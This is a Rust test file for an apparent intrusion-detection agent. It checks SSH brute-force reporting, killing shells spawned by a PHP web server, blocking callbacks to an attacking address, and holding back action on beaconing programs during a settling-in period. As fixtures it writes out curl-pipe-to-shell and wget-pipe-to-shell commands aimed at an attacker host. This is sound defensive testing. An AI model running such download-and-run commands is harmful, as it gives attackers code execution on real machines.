//! With a scripted machine: failed SSH sign-ins, refusing the address an attacked service calls back, and the
//! agent leaving its own lookups alone.

use garrett::linux::Snap;
use garrett::parse::{Conn, Proc};
use garrett::signin::Burst;
use garrett::watch::{Hands, Mode, Sensor, Watcher};
use serde_json::Value;
use std::collections::{HashMap, HashSet};

#[derive(Default)]
struct Machine {
    windows: bool,
    procs: Vec<Proc>,
    conns: Vec<Conn>,
    lines: HashMap<u32, String>,
    listening: HashSet<u32>,
    bursts: Vec<Burst>,
}

impl Sensor for Machine {
    fn system(&self) -> &str {
        if self.windows { "windows" } else { "linux" }
    }
    fn processes(&mut self) -> Vec<Proc> {
        self.procs.clone()
    }
    fn connections(&mut self) -> Vec<Conn> {
        self.conns.clone()
    }
    fn command_lines(&mut self, pids: &[u32]) -> HashMap<u32, String> {
        pids.iter().filter_map(|pid| self.lines.get(pid).map(|line| (*pid, line.clone()))).collect()
    }
    fn file_age(&mut self, _path: &str, _now: f64) -> Option<f64> {
        None
    }
    fn listening(&self) -> HashSet<u32> {
        self.listening.clone()
    }
    fn sign_ins(&mut self) -> Vec<Burst> {
        std::mem::take(&mut self.bursts)
    }
}

#[derive(Default)]
struct Recorded {
    killed: Vec<u32>,
    refused: Vec<Vec<String>>,
}

impl Hands for Recorded {
    fn suspend(&mut self, _pid: u32) -> bool {
        true
    }
    fn resume(&mut self, _pid: u32) -> bool {
        true
    }
    fn kill(&mut self, pid: u32) -> bool {
        self.killed.push(pid);
        true
    }
    fn block(&mut self, addresses: &[String]) -> Option<bool> {
        self.refused.push(addresses.to_vec());
        Some(true)
    }
}

const T: f64 = 1_800_000_000.0;

fn look(watcher: &mut Watcher<Machine, Recorded>, now: f64, started: &[Snap]) -> Vec<Value> {
    let cases = watcher.tick_with(now, started);
    watcher.mark_reported(&cases, now);
    cases
}

#[test]
fn a_burst_of_failed_ssh_sign_ins_is_one_case_an_hour_and_a_success_after_it_is_said_at_once() {
    let mut watcher = Watcher::new(Machine::default(), Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
    let burst = Burst { address: "93.184.216.34".into(), count: 31, accounts: 12, accepted: String::new() };
    watcher.sensor.bursts = vec![burst.clone()];
    let cases = look(&mut watcher, T, &[]);
    assert_eq!(cases.len(), 1);
    assert_eq!(cases[0]["name"], "SSH sign-ins from 93.184.216.34");
    assert_eq!(cases[0]["level"], "SUSPECT");
    assert_eq!(cases[0]["signals"][0]["id"], "logon_failure_burst");
    assert_eq!(cases[0]["signals"][0]["evidence"], "The address 93.184.216.34 made 31 failed SSH sign-ins in a few minutes, trying 12 account name(s).");
    assert_eq!(cases[0]["remotes"][0], serde_json::json!({"address": "93.184.216.34", "port": 0, "names": [], "direction": "in"}));
    assert!(cases[0].get("actions").is_none(), "a sign-in service is never acted on");
    watcher.sensor.bursts = vec![burst.clone()];
    assert!(look(&mut watcher, T + 60.0, &[]).is_empty(), "the same burst is not said again inside the hour");
    watcher.sensor.bursts = vec![Burst { accepted: "deploy".into(), ..burst.clone() }];
    let cases = look(&mut watcher, T + 120.0, &[]);
    assert_eq!(cases.len(), 1);
    assert!(cases[0]["signals"][0]["evidence"].as_str().unwrap().ends_with("A sign-in from it then succeeded, as deploy."));
    watcher.sensor.bursts = vec![Burst { accepted: "deploy".into(), ..burst.clone() }];
    assert!(look(&mut watcher, T + 180.0, &[]).is_empty());
    watcher.sensor.bursts = vec![burst];
    assert_eq!(look(&mut watcher, T + 3800.0, &[]).len(), 1, "still going an hour later: said again");
    assert!(watcher.hands.as_ref().unwrap().refused.is_empty() && watcher.hands.as_ref().unwrap().killed.is_empty());
}

fn attacked(mode: Mode) -> (Watcher<Machine, Recorded>, String) {
    let server = Proc { pid: 100, ppid: 1, name: "php-fpm8.3".into(), path: "/usr/sbin/php-fpm8.3".into(), started: 5 };
    let worker = Proc { pid: 101, ppid: 100, name: "php-fpm8.3".into(), path: "/usr/sbin/php-fpm8.3".into(), started: 6 };
    let machine = Machine { procs: vec![server, worker], listening: HashSet::from([100, 101]), ..Machine::default() };
    let mut watcher = Watcher::new(machine, Some(Recorded::default()), &"a".repeat(64), mode, "");
    watcher.own.insert(1_000_000_000);
    watcher.sensor.conns = vec![Conn::new(101, 80, "93.184.216.34", 51000, true, "10.0.0.5")];
    assert!(look(&mut watcher, T, &[]).is_empty());
    // The attacker's request makes a worker start a download-and-run shell.
    let shell = Proc { pid: 200, ppid: 101, name: "sh".into(), path: "/usr/bin/dash".into(), started: 9 };
    let snap = Snap { proc: shell.clone(), cmdline: "sh -c curl -s http://93.184.216.34/p | sh".into(), parent: "php-fpm8.3".into(), jumped: false, handed: false };
    watcher.sensor.procs.push(shell);
    watcher.sensor.lines.insert(200, snap.cmdline.clone());
    watcher.on_exec(&snap, T + 1.0);
    let cases = look(&mut watcher, T + 1.0, &[snap]);
    assert_eq!(cases.len(), 1, "{cases:?}");
    assert!(cases[0]["signals"].as_array().unwrap().iter().any(|signal| signal["id"] == "shell_from_web_server"));
    let key = cases[0]["key"].as_str().unwrap().to_string();
    watcher.sensor.procs.retain(|proc| proc.pid != 200);
    (watcher, key)
}

#[test]
fn a_service_that_calls_its_attacker_back_has_that_one_address_refused() {
    let (mut watcher, key) = attacked(Mode::Kill);
    assert_eq!(watcher.hands.as_ref().unwrap().killed, [200]);
    // Its ordinary work goes on: a call to an address that never connected in is not touched.
    watcher.sensor.conns = vec![Conn::new(101, 80, "93.184.216.34", 51000, true, "10.0.0.5"), Conn::new(100, 40000, "151.101.1.69", 443, false, "10.0.0.5")];
    assert!(look(&mut watcher, T + 5.0, &[]).is_empty());
    assert!(watcher.hands.as_ref().unwrap().refused.is_empty());
    // Then code inside another worker opens a connection back to the address that attacked.
    watcher.sensor.conns.push(Conn::new(100, 40002, "93.184.216.34", 4444, false, "10.0.0.5"));
    let cases = look(&mut watcher, T + 10.0, &[]);
    assert_eq!(cases.len(), 1, "{cases:?}");
    assert_eq!(cases[0]["key"], key.as_str(), "said under the attack's own case");
    let steps = cases[0]["cleanup"].as_array().unwrap();
    assert_eq!(steps.last().unwrap(), &serde_json::json!({"action": "disabled", "kind": "call out of php-fpm8.3", "where": "93.184.216.34 port 4444"}));
    assert!(cases[0]["remotes"].as_array().unwrap().iter().any(|remote| remote["address"] == "93.184.216.34" && remote["direction"] == "out"));
    assert_eq!(watcher.hands.as_ref().unwrap().refused, [vec!["93.184.216.34".to_string()]]);
    assert!(watcher.hands.as_ref().unwrap().killed == [200], "the service itself is never ended");
    // Said once; refused for an hour; then let through again.
    assert!(look(&mut watcher, T + 15.0, &[]).is_empty());
    watcher.sensor.conns.clear();
    assert!(look(&mut watcher, T + 3700.0, &[]).is_empty());
    assert_eq!(watcher.hands.as_ref().unwrap().refused.last().unwrap(), &Vec::<String>::new());
}

#[test]
fn marking_the_case_as_the_owners_lifts_the_refusal_and_a_pausing_agent_only_reports_the_call() {
    let (mut watcher, key) = attacked(Mode::Kill);
    watcher.sensor.conns.push(Conn::new(100, 40002, "93.184.216.34", 4444, false, "10.0.0.5"));
    assert_eq!(look(&mut watcher, T + 10.0, &[]).len(), 1);
    assert_eq!(watcher.hands.as_ref().unwrap().refused.len(), 1);
    watcher.set_trusted(&serde_json::json!([key]));
    look(&mut watcher, T + 20.0, &[]);
    assert_eq!(watcher.hands.as_ref().unwrap().refused.last().unwrap(), &Vec::<String>::new());

    let (mut watcher, _) = attacked(Mode::Pause);
    watcher.sensor.conns.push(Conn::new(100, 40002, "93.184.216.34", 4444, false, "10.0.0.5"));
    let cases = look(&mut watcher, T + 10.0, &[]);
    assert_eq!(cases.len(), 1, "{cases:?}");
    assert_eq!(cases[0]["cleanup"].as_array().unwrap().last().unwrap()["action"], "left");
    assert!(watcher.hands.as_ref().unwrap().refused.is_empty());
}

#[test]
fn the_agents_own_lookups_are_never_judged_and_the_same_command_from_anyone_else_is() {
    // The Windows Security-log lookup is a PowerShell command that names the attacks it searches for.
    let line = "powershell.exe -NoProfile -Command \"$o+=[pscustomobject]@{Kind='kerberoast'}; $o+=[pscustomobject]@{Kind='dcsync'}\"";
    let agent = Proc { pid: 500, ppid: 4, name: "garrett.exe".into(), path: "C:\\Program Files\\garrett\\garrett.exe".into(), started: 1 };
    let shell = Proc { pid: 600, ppid: 4, name: "cmd.exe".into(), path: "C:\\Windows\\System32\\cmd.exe".into(), started: 2 };
    let lookup = |pid: u32, ppid: u32| Proc { pid, ppid, name: "powershell.exe".into(), path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".into(), started: pid as u64 };
    let machine = Machine { windows: true, procs: vec![agent, shell, lookup(700, 500), lookup(800, 600)], lines: HashMap::from([(700, line.to_string()), (800, line.to_string())]), ..Machine::default() };
    let mut watcher = Watcher::new(machine, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "c:\\windows\\");
    watcher.own.insert(500);
    watcher.myself = 500;
    let mine = Snap { proc: lookup(700, 500), cmdline: line.into(), parent: "garrett.exe".into(), jumped: false, handed: false };
    let theirs = Snap { proc: lookup(800, 600), cmdline: line.into(), parent: "cmd.exe".into(), jumped: false, handed: false };
    watcher.on_exec(&mine, T);
    assert!(watcher.hands.as_ref().unwrap().killed.is_empty(), "the agent ended its own lookup");
    watcher.on_exec(&theirs, T);
    assert_eq!(watcher.hands.as_ref().unwrap().killed, [800]);
    let cases = look(&mut watcher, T + 1.0, &[mine, theirs]);
    assert_eq!(cases.len(), 1, "{cases:?}");
    assert_eq!(cases[0]["parent"], "cmd.exe");
    assert_eq!(watcher.hands.as_ref().unwrap().killed, [800]);
}

/// A program in a temporary folder that calls the same internet address on an odd port every half minute: nothing
/// names it an attack, but its score reaches the hostile level.
fn beacon(watcher: &mut Watcher<Machine, Recorded>, from: f64, looks: u32) -> Vec<Value> {
    let mut last = Vec::new();
    for number in 0..looks {
        watcher.sensor.conns = vec![Conn::new(300, 41000 + number, "93.184.216.34", 8444, false, "10.0.0.5")];
        let cases = look(watcher, from + 30.0 * number as f64, &[]);
        if !cases.is_empty() {
            last = cases;
        }
    }
    last
}

fn with_beacon(folder: &std::path::Path, hours: f64) -> Watcher<Machine, Recorded> {
    let _ = std::fs::remove_dir_all(folder);
    std::fs::create_dir_all(folder).unwrap();
    let program = Proc { pid: 300, ppid: 1, name: "updater".into(), path: "/tmp/x/updater".into(), started: 7 };
    let mut watcher = Watcher::new(Machine { procs: vec![program], ..Machine::default() }, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
    watcher.own.insert(1_000_000_000);
    watcher.keep_in(folder, false);
    watcher.settle_in(hours, true, T);
    watcher
}

#[test]
fn a_fresh_install_leaves_a_merely_suspicious_program_for_its_owner_and_still_stops_an_attack() {
    let folder = std::env::temp_dir().join(format!("garrett-settle-test-{}", std::process::id()));
    // With no settling in, the program is ended as soon as its score says hostile.
    let mut hasty = with_beacon(&folder, 0.0);
    let cases = beacon(&mut hasty, T, 8);
    assert_eq!(cases[0]["level"], "HOSTILE", "{cases:?}");
    assert_eq!(hasty.hands.as_ref().unwrap().killed, [300]);

    // Settling in: reported, said to be left running, not touched.
    let mut watcher = with_beacon(&folder, 24.0);
    assert!(watcher.settling(T).0 > 23.0 * 3600.0);
    let cases = beacon(&mut watcher, T, 8);
    assert_eq!(cases[0]["level"], "HOSTILE", "{cases:?}");
    assert_eq!(cases[0]["held"], "learning");
    assert!(cases[0].get("actions").is_none());
    assert!(watcher.hands.as_ref().unwrap().killed.is_empty());
    assert_eq!(watcher.settling(T + 600.0).1, 1);
    let key = cases[0]["key"].as_str().unwrap().to_string();

    // The day is over and the agent has been restarted: that program is still the owner's to judge.
    let program = Proc { pid: 300, ppid: 1, name: "updater".into(), path: "/tmp/x/updater".into(), started: 7 };
    let mut later = Watcher::new(Machine { procs: vec![program], ..Machine::default() }, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
    later.own.insert(1_000_000_000);
    later.keep_in(&folder, false);
    later.settle_in(24.0, false, T + 90_000.0);
    assert_eq!(later.settling(T + 90_000.0), (0.0, 1));
    let cases = beacon(&mut later, T + 90_000.0, 8);
    assert_eq!(cases[0]["held"], "here first", "{cases:?}");
    assert!(later.hands.as_ref().unwrap().killed.is_empty());
    // Until the owner says it was an attack.
    later.set_confirmed(&serde_json::json!([key]));
    beacon(&mut later, T + 91_000.0, 2);
    assert_eq!(later.hands.as_ref().unwrap().killed, [300]);

    // And through all of it, what is plainly an attack is stopped from the first second.
    let (mut watcher, _) = attacked(Mode::Kill);
    assert_eq!(watcher.hands.as_ref().unwrap().killed, [200]);
    let settle = std::env::temp_dir().join(format!("garrett-settle-test-b-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&settle);
    std::fs::create_dir_all(&settle).unwrap();
    watcher.keep_in(&settle, false);
    watcher.settle_in(24.0, true, T + 2.0);
    let shell = Proc { pid: 201, ppid: 101, name: "sh".into(), path: "/usr/bin/dash".into(), started: 11 };
    let snap = Snap { proc: shell.clone(), cmdline: "sh -c wget -qO- http://93.184.216.34/q | sh".into(), parent: "php-fpm8.3".into(), jumped: false, handed: false };
    watcher.sensor.procs.push(shell);
    watcher.on_exec(&snap, T + 3.0);
    assert_eq!(watcher.hands.as_ref().unwrap().killed, [200, 201]);
    let _ = std::fs::remove_dir_all(&folder);
    let _ = std::fs::remove_dir_all(&settle);
}

#[test]
fn the_privacy_shields_addresses_are_handed_out_to_be_written_without_holding_the_watcher() {
    let mut watcher = Watcher::new(Machine::default(), Some(Recorded::default()), &"a".repeat(64), Mode::Pause, "");
    assert_eq!(watcher.block_wanted(), None, "nothing to refuse, nothing to write");
    watcher.set_shield(&["74.119.117.5".to_string(), "10.0.0.9".to_string(), "74.119.117.5".to_string()]);
    assert!(watcher.hands.as_ref().unwrap().refused.is_empty(), "the watcher did not write the firewall itself");
    let target = watcher.block_wanted().unwrap();
    assert_eq!(target, ["74.119.117.5"], "public addresses only, each once");
    watcher.block_done(target, Some(true));
    assert_eq!(watcher.block_wanted(), None);
    watcher.set_shield(&[]);
    assert_eq!(watcher.block_wanted(), Some(Vec::new()), "switched off: the list to write is empty");
    watcher.block_done(Vec::new(), Some(true));
    assert_eq!(watcher.block_wanted(), None);
    // An agent that only reports has no hands, and is never asked to write anything.
    let mut reporting: Watcher<Machine, Recorded> = Watcher::new(Machine::default(), None, &"a".repeat(64), Mode::Pause, "");
    reporting.set_shield(&["74.119.117.5".to_string()]);
    assert_eq!(reporting.block_wanted(), None);
}
